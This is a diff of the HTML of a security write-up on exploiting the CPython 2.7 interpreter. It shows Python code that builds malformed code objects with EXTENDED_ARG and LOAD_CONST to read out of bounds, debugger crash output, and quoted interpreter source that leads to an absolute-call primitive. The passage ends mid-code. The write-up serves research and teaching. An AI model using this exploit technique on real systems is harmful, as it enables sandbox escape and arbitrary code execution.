-  <span class="p">(),</span> <span class="p">(),</span> <span class="p">(),</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;&#39;</span>
-<span class="p">)</span>
-<span class="n">a</span><span class="p">()</span>
+    <span class="n">a</span><span class="o">.</span><span class="n">func_code</span> <span class="o">=</span> <span class="n">types</span><span class="o">.</span><span class="n">CodeType</span><span class="p">(</span>
+      <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
+      <span class="nb">chr</span><span class="p">(</span><span class="n">opcode</span><span class="o">.</span><span class="n">opmap</span><span class="p">[</span><span class="s1">&#39;EXTENDED_ARG&#39;</span><span class="p">])</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\xef\xbe</span><span class="s1">&#39;</span> <span class="o">+</span>
+      <span class="nb">chr</span><span class="p">(</span><span class="n">opcode</span><span class="o">.</span><span class="n">opmap</span><span class="p">[</span><span class="s1">&#39;LOAD_CONST&#39;</span><span class="p">])</span>   <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\xad\xde</span><span class="s1">&#39;</span><span class="p">,</span>
+      <span class="p">(),</span> <span class="p">(),</span> <span class="p">(),</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;&#39;</span>
+    <span class="p">)</span>
+    <span class="n">a</span><span class="p">()</span>
 </pre></div>
 
 
 <p>..and as expected you get a fault (<em>oparg</em> is <em>edi</em>):</p>
-<div class="highlight"><pre><span></span>(2058.2108): Access violation - code c0000005 (!!! second chance !!!)
-[...]
-eax=01cb1030 ebx=00000000 ecx=00000063 edx=00000046 esi=1e222c0c edi=beefdead
-eip=1e0ec5f7 esp=0027e7f8 ebp=0273a9f0 iopl=0         nv up ei ng nz na pe cy
-cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010287
-python27!PyEval_EvalFrameEx+0x347:
-1e0ec5f7 8b74b80c        mov     esi,dword ptr [eax+edi*4+0Ch] ds:002b:fd8a8af0=????????
+<div class="highlight"><pre><span></span>craaaaaaash
+    (2058.2108): Access violation - code c0000005 (!!! second chance !!!)
+    [...]
+    eax=01cb1030 ebx=00000000 ecx=00000063 edx=00000046 esi=1e222c0c edi=beefdead
+    eip=1e0ec5f7 esp=0027e7f8 ebp=0273a9f0 iopl=0         nv up ei ng nz na pe cy
+    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010287
+    python27!PyEval_EvalFrameEx+0x347:
+    1e0ec5f7 8b74b80c        mov     esi,dword ptr [eax+edi*4+0Ch] ds:002b:fd8a8af0=????????
 </pre></div>
 
 
@@ -672,134 +705,138 @@ python27!PyEval_EvalFrameEx+0x347:
 <h2 id="pushing-attacker-controlled-data-on-the-virtual-stack">Pushing attacker-controlled data on the virtual stack</h2>
 <p>We control <em>oparg</em> and the content of the tuple <em>consts</em>. We can also find out the address of that tuple. So we can have a Python string object that stores an arbitrary value, let's say <em>0xdeadbeef</em> and it will be pushed on the virtual stack.</p>
 <p>Let's do that in Python now:</p>
-<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">opcode</span>
-<span class="kn">import</span> <span class="nn">types</span>
-<span class="kn">import</span> <span class="nn">struct</span>
+<div class="highlight"><pre><span></span><span class="n">Pushing</span> <span class="n">controlled</span> <span class="n">value</span> <span class="n">on</span> <span class="n">the</span> <span class="n">virtual</span> <span class="n">stack</span>
+    <span class="kn">import</span> <span class="nn">opcode</span>
+    <span class="kn">import</span> <span class="nn">types</span>
+    <span class="kn">import</span> <span class="nn">struct</span>
 
-<span class="k">def</span> <span class="nf">pshort</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
-    <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&amp;lt;H&#39;</span><span class="p">,</span> <span class="n">s</span><span class="p">)</span>
+    <span class="k">def</span> <span class="nf">pshort</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+        <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;H&#39;</span><span class="p">,</span> <span class="n">s</span><span class="p">)</span>
 
-<span class="k">def</span> <span class="nf">a</span><span class="p">():</span>
-  <span class="k">pass</span>
+    <span class="k">def</span> <span class="nf">a</span><span class="p">():</span>
+      <span class="k">pass</span>
 
-<span class="n">consts</span> <span class="o">=</span> <span class="p">()</span>
-<span class="n">s</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\xef\xbe\xad\xde</span><span class="s1">&#39;</span>
-<span class="n">address_s</span> <span class="o">=</span> <span class="nb">id</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">+</span> <span class="mi">20</span> <span class="c1"># 20 is the offset of the array of byte we control in the string</span>
-<span class="n">address_consts</span> <span class="o">=</span> <span class="nb">id</span><span class="p">(</span><span class="n">consts</span><span class="p">)</span>
-<span class="c1"># python27!PyEval_EvalFrameEx+0x347:</span>
-<span class="c1"># 1e0ec5f7 8b74b80c        mov     esi,dword ptr [eax+edi*4+0Ch] ds:002b:fd8a8af0=????????</span>
-<span class="n">offset</span> <span class="o">=</span> <span class="p">((</span><span class="n">address_s</span> <span class="o">-</span> <span class="n">address_consts</span> <span class="o">-</span> <span class="mh">0xC</span><span class="p">)</span> <span class="o">/</span> <span class="mi">4</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="mh">0xffffffff</span>
-<span class="n">high</span> <span class="o">=</span> <span class="n">offset</span> <span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span> <span class="mi">16</span>
-<span class="n">low</span> <span class="o">=</span>  <span class="n">offset</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="mh">0xffff</span>
-<span class="k">print</span> <span class="s1">&#39;Consts tuple @</span><span class="si">%#.8x</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">address_consts</span>
-<span class="k">print</span> <span class="s1">&#39;Address of controled data @</span><span class="si">%#.8x</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">address_s</span>
-<span class="k">print</span> <span class="s1">&#39;Offset between const and our object: @</span><span class="si">%#.8x</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">offset</span>
-<span class="k">print</span> <span class="s1">&#39;Going to push [</span><span class="si">%#.8x</span><span class="s1">] on the virtual stack&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">address_consts</span> <span class="o">+</span> <span class="p">(</span><span class="n">address_s</span> <span class="o">-</span> <span class="n">address_consts</span> <span class="o">-</span> <span class="mh">0xC</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0xc</span><span class="p">)</span>
+    <span class="n">consts</span> <span class="o">=</span> <span class="p">()</span>
+    <span class="n">s</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\xef\xbe\xad\xde</span><span class="s1">&#39;</span>
+    <span class="n">address_s</span> <span class="o">=</span> <span class="nb">id</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">+</span> <span class="mi">20</span> <span class="c1"># 20 is the offset of the array of byte we control in the string</span>
+    <span class="n">address_consts</span> <span class="o">=</span> <span class="nb">id</span><span class="p">(</span><span class="n">consts</span><span class="p">)</span>
+    <span class="c1"># python27!PyEval_EvalFrameEx+0x347:</span>
+    <span class="c1"># 1e0ec5f7 8b74b80c        mov     esi,dword ptr [eax+edi*4+0Ch] ds:002b:fd8a8af0=????????</span>
+    <span class="n">offset</span> <span class="o">=</span> <span class="p">((</span><span class="n">address_s</span> <span class="o">-</span> <span class="n">address_consts</span> <span class="o">-</span> <span class="mh">0xC</span><span class="p">)</span> <span class="o">/</span> <span class="mi">4</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span>
+    <span class="n">high</span> <span class="o">=</span> <span class="n">offset</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span>
+    <span class="n">low</span> <span class="o">=</span>  <span class="n">offset</span> <span class="o">&amp;</span> <span class="mh">0xffff</span>
+    <span class="k">print</span> <span class="s1">&#39;Consts tuple @</span><span class="si">%#.8x</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">address_consts</span>
+    <span class="k">print</span> <span class="s1">&#39;Address of controled data @</span><span class="si">%#.8x</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">address_s</span>
+    <span class="k">print</span> <span class="s1">&#39;Offset between const and our object: @</span><span class="si">%#.8x</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">offset</span>
+    <span class="k">print</span> <span class="s1">&#39;Going to push [</span><span class="si">%#.8x</span><span class="s1">] on the virtual stack&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">address_consts</span> <span class="o">+</span> <span class="p">(</span><span class="n">address_s</span> <span class="o">-</span> <span class="n">address_consts</span> <span class="o">-</span> <span class="mh">0xC</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0xc</span><span class="p">)</span>
 
-<span class="n">a</span><span class="o">.</span><span class="n">func_code</span> <span class="o">=</span> <span class="n">types</span><span class="o">.</span><span class="n">CodeType</span><span class="p">(</span>
-  <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
-  <span class="nb">chr</span><span class="p">(</span><span class="n">opcode</span><span class="o">.</span><span class="n">opmap</span><span class="p">[</span><span class="s1">&#39;EXTENDED_ARG&#39;</span><span class="p">])</span> <span class="o">+</span> <span class="n">pshort</span><span class="p">(</span><span class="n">high</span><span class="p">)</span> <span class="o">+</span>
-  <span class="nb">chr</span><span class="p">(</span><span class="n">opcode</span><span class="o">.</span><span class="n">opmap</span><span class="p">[</span><span class="s1">&#39;LOAD_CONST&#39;</span><span class="p">])</span>   <span class="o">+</span> <span class="n">pshort</span><span class="p">(</span><span class="n">low</span><span class="p">),</span>
-  <span class="n">consts</span><span class="p">,</span> <span class="p">(),</span> <span class="p">(),</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;&#39;</span>
-<span class="p">)</span>
-<span class="n">a</span><span class="p">()</span>
+    <span class="n">a</span><span class="o">.</span><span class="n">func_code</span> <span class="o">=</span> <span class="n">types</span><span class="o">.</span><span class="n">CodeType</span><span class="p">(</span>
+      <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
+      <span class="nb">chr</span><span class="p">(</span><span class="n">opcode</span><span class="o">.</span><span class="n">opmap</span><span class="p">[</span><span class="s1">&#39;EXTENDED_ARG&#39;</span><span class="p">])</span> <span class="o">+</span> <span class="n">pshort</span><span class="p">(</span><span class="n">high</span><span class="p">)</span> <span class="o">+</span>
+      <span class="nb">chr</span><span class="p">(</span><span class="n">opcode</span><span class="o">.</span><span class="n">opmap</span><span class="p">[</span><span class="s1">&#39;LOAD_CONST&#39;</span><span class="p">])</span>   <span class="o">+</span> <span class="n">pshort</span><span class="p">(</span><span class="n">low</span><span class="p">),</span>
+      <span class="n">consts</span><span class="p">,</span> <span class="p">(),</span> <span class="p">(),</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;&#39;</span>
+    <span class="p">)</span>
+    <span class="n">a</span><span class="p">()</span>
 </pre></div>
 
 
 <p>..annnnd..</p>
-<div class="highlight"><pre><span></span>D:\&amp;gt;python 1.py
-Consts tuple @0x01db1030
-Address of controled data @0x022a0654
-Offset between const and our object: @0x0013bd86
-Going to push [0x022a0654] on the virtual stack
+<div class="highlight"><pre><span></span>debugger view
+    D:\&gt;python 1.py
+    Consts tuple @0x01db1030
+    Address of controled data @0x022a0654
+    Offset between const and our object: @0x0013bd86
+    Going to push [0x022a0654] on the virtual stack
 
-*JIT debugger pops*
+    *JIT debugger pops*
 
-eax=01db1030 ebx=00000000 ecx=00000063 edx=00000046 esi=deadbeef edi=0013bd86
-eip=1e0ec5fb esp=0027fc68 ebp=01e63fc0 iopl=0         nv up ei ng nz na pe cy
-cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010287
-python27!PyEval_EvalFrameEx+0x34b:
-1e0ec5fb ff06            inc     dword ptr [esi]      ds:002b:deadbeef=????????
-0:000&amp;gt; ub eip l1
-python27!PyEval_EvalFrameEx+0x347:
-1e0ec5f7 8b74b80c        mov     esi,dword ptr [eax+edi*4+0Ch]
-0:000&amp;gt; ? eax+edi*4+c
-Evaluate expression: 36308564 = 022a0654
-0:000&amp;gt; dd 022a0654 l1
-022a0654  deadbeef &amp;lt;- the data we control in our PyStringObject
-0:000&amp;gt; dps 022a0654-0n20 l2
-022a0640  00000003
-022a0644  1e226798 python27!PyString_Type
+    eax=01db1030 ebx=00000000 ecx=00000063 edx=00000046 esi=deadbeef edi=0013bd86
+    eip=1e0ec5fb esp=0027fc68 ebp=01e63fc0 iopl=0         nv up ei ng nz na pe cy
+    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010287
+    python27!PyEval_EvalFrameEx+0x34b:
+    1e0ec5fb ff06            inc     dword ptr [esi]      ds:002b:deadbeef=????????
+    0:000&gt; ub eip l1
+    python27!PyEval_EvalFrameEx+0x347:
+    1e0ec5f7 8b74b80c        mov     esi,dword ptr [eax+edi*4+0Ch]
+    0:000&gt; ? eax+edi*4+c
+    Evaluate expression: 36308564 = 022a0654
+    0:000&gt; dd 022a0654 l1
+    022a0654  deadbeef &lt;- the data we control in our PyStringObject
+    0:000&gt; dps 022a0654-0n20 l2
+    022a0640  00000003
+    022a0644  1e226798 python27!PyString_Type
 </pre></div>
 
 
 <p>Perfect, we control a part of the virtual stack :).</p>
 <h2 id="game-over-load_function">Game over, LOAD_FUNCTION</h2>
 <p>Once you control the virtual stack, the only limit is your imagination and the ability you have to find an interesting spot in the virtual machine. My idea was to use the <em>CALL_FUNCTION</em> opcode to craft a <em>PyFunctionObject</em> somehow, push it onto the virtual stack and to use the magic opcode. </p>
-<div class="highlight"><pre><span></span><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
-  <span class="n">PyObject_HEAD</span>
-  <span class="n">PyObject</span> <span class="o">*</span><span class="n">func_code</span><span class="p">;</span>  <span class="cm">/* A code object */</span>
-  <span class="n">PyObject</span> <span class="o">*</span><span class="n">func_globals</span><span class="p">;</span> <span class="cm">/* A dictionary (other mappings won&#39;t do) */</span>
-  <span class="n">PyObject</span> <span class="o">*</span><span class="n">func_defaults</span><span class="p">;</span>  <span class="cm">/* NULL or a tuple */</span>
-  <span class="n">PyObject</span> <span class="o">*</span><span class="n">func_closure</span><span class="p">;</span> <span class="cm">/* NULL or a tuple of cell objects */</span>
-  <span class="n">PyObject</span> <span class="o">*</span><span class="n">func_doc</span><span class="p">;</span>   <span class="cm">/* The __doc__ attribute, can be anything */</span>
-  <span class="n">PyObject</span> <span class="o">*</span><span class="n">func_name</span><span class="p">;</span>  <span class="cm">/* The __name__ attribute, a string object */</span>
-  <span class="n">PyObject</span> <span class="o">*</span><span class="n">func_dict</span><span class="p">;</span>  <span class="cm">/* The __dict__ attribute, a dict or NULL */</span>
-  <span class="n">PyObject</span> <span class="o">*</span><span class="n">func_weakreflist</span><span class="p">;</span> <span class="cm">/* List of weak references */</span>
-  <span class="n">PyObject</span> <span class="o">*</span><span class="n">func_module</span><span class="p">;</span>  <span class="cm">/* The __module__ attribute, can be anything */</span>
-<span class="p">}</span> <span class="n">PyFunctionObject</span><span class="p">;</span>
+<div class="highlight"><pre><span></span><span class="n">PyFunctionObject</span> <span class="n">definition</span>
+    <span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
+      <span class="n">PyObject_HEAD</span>
+      <span class="n">PyObject</span> <span class="o">*</span><span class="n">func_code</span><span class="p">;</span>  <span class="cm">/* A code object */</span>
+      <span class="n">PyObject</span> <span class="o">*</span><span class="n">func_globals</span><span class="p">;</span> <span class="cm">/* A dictionary (other mappings won&#39;t do) */</span>
+      <span class="n">PyObject</span> <span class="o">*</span><span class="n">func_defaults</span><span class="p">;</span>  <span class="cm">/* NULL or a tuple */</span>
+      <span class="n">PyObject</span> <span class="o">*</span><span class="n">func_closure</span><span class="p">;</span> <span class="cm">/* NULL or a tuple of cell objects */</span>
+      <span class="n">PyObject</span> <span class="o">*</span><span class="n">func_doc</span><span class="p">;</span>   <span class="cm">/* The __doc__ attribute, can be anything */</span>
+      <span class="n">PyObject</span> <span class="o">*</span><span class="n">func_name</span><span class="p">;</span>  <span class="cm">/* The __name__ attribute, a string object */</span>
+      <span class="n">PyObject</span> <span class="o">*</span><span class="n">func_dict</span><span class="p">;</span>  <span class="cm">/* The __dict__ attribute, a dict or NULL */</span>
+      <span class="n">PyObject</span> <span class="o">*</span><span class="n">func_weakreflist</span><span class="p">;</span> <span class="cm">/* List of weak references */</span>
+      <span class="n">PyObject</span> <span class="o">*</span><span class="n">func_module</span><span class="p">;</span>  <span class="cm">/* The __module__ attribute, can be anything */</span>
+    <span class="p">}</span> <span class="n">PyFunctionObject</span><span class="p">;</span>
 </pre></div>
 
 
 <p>The thing is, as we saw earlier, the virtual machine usually ensures the type of the object it handles. If the type checking fails, the function bails out and we are not happy, at all. It means we would need an information-leak to obtain a pointer to the PyFunction_Type static variable.</p>
 <p>Fortunately for us, the CALL_FUNCTION can still be abused without knowing that magic pointer to craft correctly our object. Let's go over the source code to illustrate my sayings:</p>
-<div class="highlight"><pre><span></span><span class="k">case</span> <span class="nl">CALL_FUNCTION</span><span class="p">:</span>
-<span class="p">{</span>
-  <span class="n">PyObject</span> <span class="o">**</span><span class="n">sp</span><span class="p">;</span>
-  <span class="n">PCALL</span><span class="p">(</span><span class="n">PCALL_ALL</span><span class="p">);</span>
-  <span class="n">sp</span> <span class="o">=</span> <span class="n">stack_pointer</span><span class="p">;</span>
-  <span class="n">x</span> <span class="o">=</span> <span class="n">call_function</span><span class="p">(</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">sp</span><span class="p">,</span> <span class="n">oparg</span><span class="p">);</span>
+<div class="highlight"><pre><span></span><span class="n">CALL_FUNCTION</span>
+    <span class="k">case</span> <span class="nl">CALL_FUNCTION</span><span class="p">:</span>
+    <span class="p">{</span>
+      <span class="n">PyObject</span> <span class="o">**</span><span class="n">sp</span><span class="p">;</span>
+      <span class="n">PCALL</span><span class="p">(</span><span class="n">PCALL_ALL</span><span class="p">);</span>
+      <span class="n">sp</span> <span class="o">=</span> <span class="n">stack_pointer</span><span class="p">;</span>
+      <span class="n">x</span> <span class="o">=</span> <span class="n">call_function</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sp</span><span class="p">,</span> <span class="n">oparg</span><span class="p">);</span>
 
-<span class="k">static</span> <span class="n">PyObject</span> <span class="o">*</span>
-<span class="nf">call_function</span><span class="p">(</span><span class="n">PyObject</span> <span class="o">***</span><span class="n">pp_stack</span><span class="p">,</span> <span class="kt">int</span> <span class="n">oparg</span><span class="p">)</span>
-<span class="p">{</span>
-  <span class="kt">int</span> <span class="n">na</span> <span class="o">=</span> <span class="n">oparg</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="mh">0xff</span><span class="p">;</span>
-  <span class="kt">int</span> <span class="n">nk</span> <span class="o">=</span> <span class="p">(</span><span class="n">oparg</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="mh">0xff</span><span class="p">;</span>
-  <span class="kt">int</span> <span class="n">n</span> <span class="o">=</span> <span class="n">na</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">nk</span><span class="p">;</span>
-  <span class="n">PyObject</span> <span class="o">**</span><span class="n">pfunc</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="n">pp_stack</span><span class="p">)</span> <span class="o">-</span> <span class="n">n</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
-  <span class="n">PyObject</span> <span class="o">*</span><span class="n">func</span> <span class="o">=</span> <span class="o">*</span><span class="n">pfunc</span><span class="p">;</span>
-  <span class="n">PyObject</span> <span class="o">*</span><span class="n">x</span><span class="p">,</span> <span class="o">*</span><span class="n">w</span><span class="p">;</span>
+    <span class="k">static</span> <span class="n">PyObject</span> <span class="o">*</span>
+    <span class="nf">call_function</span><span class="p">(</span><span class="n">PyObject</span> <span class="o">***</span><span class="n">pp_stack</span><span class="p">,</span> <span class="kt">int</span> <span class="n">oparg</span><span class="p">)</span>
+    <span class="p">{</span>
+      <span class="kt">int</span> <span class="n">na</span> <span class="o">=</span> <span class="n">oparg</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">;</span>
+      <span class="kt">int</span> <span class="n">nk</span> <span class="o">=</span> <span class="p">(</span><span class="n">oparg</span><span class="o">&gt;&gt;</span><span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">;</span>
+      <span class="kt">int</span> <span class="n">n</span> <span class="o">=</span> <span class="n">na</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">nk</span><span class="p">;</span>
+      <span class="n">PyObject</span> <span class="o">**</span><span class="n">pfunc</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="n">pp_stack</span><span class="p">)</span> <span class="o">-</span> <span class="n">n</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
+      <span class="n">PyObject</span> <span class="o">*</span><span class="n">func</span> <span class="o">=</span> <span class="o">*</span><span class="n">pfunc</span><span class="p">;</span>
+      <span class="n">PyObject</span> <span class="o">*</span><span class="n">x</span><span class="p">,</span> <span class="o">*</span><span class="n">w</span><span class="p">;</span>
 
-  <span class="k">if</span> <span class="p">(</span><span class="n">PyCFunction_Check</span><span class="p">(</span><span class="n">func</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="n">nk</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
-    <span class="c1">// ..Nope..</span>
-  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-    <span class="k">if</span> <span class="p">(</span><span class="n">PyMethod_Check</span><span class="p">(</span><span class="n">func</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="n">PyMethod_GET_SELF</span><span class="p">(</span><span class="n">func</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
-      <span class="c1">// ..Still Nope...</span>
-    <span class="p">}</span> <span class="k">else</span>
-    <span class="k">if</span> <span class="p">(</span><span class="n">PyFunction_Check</span><span class="p">(</span><span class="n">func</span><span class="p">))</span>
-      <span class="c1">// Nope!</span>
-    <span class="k">else</span>
-      <span class="n">x</span> <span class="o">=</span> <span class="n">do_call</span><span class="p">(</span><span class="n">func</span><span class="p">,</span> <span class="n">pp_stack</span><span class="p">,</span> <span class="n">na</span><span class="p">,</span> <span class="n">nk</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">PyCFunction_Check</span><span class="p">(</span><span class="n">func</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">nk</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="c1">// ..Nope..</span>
+      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">PyMethod_Check</span><span class="p">(</span><span class="n">func</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">PyMethod_GET_SELF</span><span class="p">(</span><span class="n">func</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+          <span class="c1">// ..Still Nope...</span>
+        <span class="p">}</span> <span class="k">else</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">PyFunction_Check</span><span class="p">(</span><span class="n">func</span><span class="p">))</span>
+          <span class="c1">// Nope!</span>
+        <span class="k">else</span>
+          <span class="n">x</span> <span class="o">=</span> <span class="n">do_call</span><span class="p">(</span><span class="n">func</span><span class="p">,</span> <span class="n">pp_stack</span><span class="p">,</span> <span class="n">na</span><span class="p">,</span> <span class="n">nk</span><span class="p">);</span>
 
-<span class="k">static</span> <span class="n">PyObject</span> <span class="o">*</span>
-<span class="n">do_call</span><span class="p">(</span><span class="n">PyObject</span> <span class="o">*</span><span class="n">func</span><span class="p">,</span> <span class="n">PyObject</span> <span class="o">***</span><span class="n">pp_stack</span><span class="p">,</span> <span class="kt">int</span> <span class="n">na</span><span class="p">,</span> <span class="kt">int</span> <span class="n">nk</span><span class="p">)</span>
-<span class="p">{</span>
-  <span class="c1">// ...</span>
-  <span class="k">if</span> <span class="p">(</span><span class="n">PyCFunction_Check</span><span class="p">(</span><span class="n">func</span><span class="p">))</span> <span class="p">{</span>
-    <span class="c1">// Nope</span>
-  <span class="p">}</span>
-  <span class="k">else</span>
-    <span class="n">result</span> <span class="o">=</span> <span class="n">PyObject_Call</span><span class="p">(</span><span class="n">func</span><span class="p">,</span> <span class="n">callargs</span><span class="p">,</span> <span class="n">kwdict</span><span class="p">);</span>
+    <span class="k">static</span> <span class="n">PyObject</span> <span class="o">*</span>
+    <span class="n">do_call</span><span class="p">(</span><span class="n">PyObject</span> <span class="o">*</span><span class="n">func</span><span class="p">,</span> <span class="n">PyObject</span> <span class="o">***</span><span class="n">pp_stack</span><span class="p">,</span> <span class="kt">int</span> <span class="n">na</span><span class="p">,</span> <span class="kt">int</span> <span class="n">nk</span><span class="p">)</span>
+    <span class="p">{</span>
+      <span class="c1">// ...</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">PyCFunction_Check</span><span class="p">(</span><span class="n">func</span><span class="p">))</span> <span class="p">{</span>
+        <span class="c1">// Nope</span>
+      <span class="p">}</span>
+      <span class="k">else</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="n">PyObject_Call</span><span class="p">(</span><span class="n">func</span><span class="p">,</span> <span class="n">callargs</span><span class="p">,</span> <span class="n">kwdict</span><span class="p">);</span>
 
-<span class="n">PyObject</span> <span class="o">*</span>
-<span class="n">PyObject_Call</span><span class="p">(</span><span class="n">PyObject</span> <span class="o">*</span><span class="n">func</span><span class="p">,</span> <span class="n">PyObject</span> <span class="o">*</span><span class="n">arg</span><span class="p">,</span> <span class="n">PyObject</span> <span class="o">*</span><span class="n">kw</span><span class="p">)</span>
-<span class="p">{</span>
-  <span class="n">ternaryfunc</span> <span class="n">call</span><span class="p">;</span>
+    <span class="n">PyObject</span> <span class="o">*</span>
+    <span class="n">PyObject_Call</span><span class="p">(</span><span class="n">PyObject</span> <span class="o">*</span><span class="n">func</span><span class="p">,</span> <span class="n">PyObject</span> <span class="o">*</span><span class="n">arg</span><span class="p">,</span> <span class="n">PyObject</span> <span class="o">*</span><span class="n">kw</span><span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">ternaryfunc</span> <span class="n">call</span><span class="p">;</span>
 
-  <span class="k">if</span> <span class="p">((</span><span class="n">call</span> <span class="o">=</span> <span class="n">func</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">ob_type</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">tp_call</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
-    <span class="n">PyObject</span> <span class="o">*</span><span class="n">result</span><span class="p">;</span>
-    <span class="c1">// Yay an interesting call :)</span>
-    <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="n">call</span><span class="p">)(</span><span class="n">func</span><span class="p">,</span> <span class="n">arg</span><span class="p">,</span> <span class="n">kw</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">((</span><span class="n">call</span> <span class="o">=</span> <span class="n">func</span><span class="o">-&gt;</span><span class="n">ob_type</span><span class="o">-&gt;</span><span class="n">tp_call</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">PyObject</span> <span class="o">*</span><span class="n">result</span><span class="p">;</span>
+        <span class="c1">// Yay an interesting call :)</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="n">call</span><span class="p">)(</span><span class="n">func</span><span class="p">,</span> <span class="n">arg</span><span class="p">,</span> <span class="n">kw</span><span class="p">);</span>
 </pre></div>
 
 
@@ -809,52 +846,54 @@ Evaluate expression: 36308564 = 022a0654
 <li>The second object will be a <em>_typeobject</em> with <em>tp_call</em> the address you want to call</li>
 </ol>
 <p>This is fairly trivial to do and will give us an absolute-call primitive without crashing the interpreter: s.w.e.e.t.</p>
-<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">opcode</span>
-<span class="kn">import</span> <span class="nn">types</span>
-<span class="kn">import</span> <span class="nn">struct</span>
